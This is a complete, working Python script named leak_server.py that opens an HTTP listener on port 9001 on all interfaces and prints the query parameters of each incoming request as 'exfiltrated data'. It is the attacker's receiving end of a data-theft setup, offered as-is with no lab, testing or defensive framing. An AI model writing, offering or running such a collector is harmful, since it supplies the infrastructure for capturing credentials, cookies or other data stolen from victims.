# save as leak_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class LeakHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("Connection")
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)
        print("[+] Got exfiltrated data:")
        for key, val in query.items():
            print(f"{key}: {val}")
        self.send_response(200)
        self.end_headers()

httpd = HTTPServer(('0.0.0.0', 9001), LeakHandler)
print("[*] Listening on port 9001...")
httpd.serve_forever()

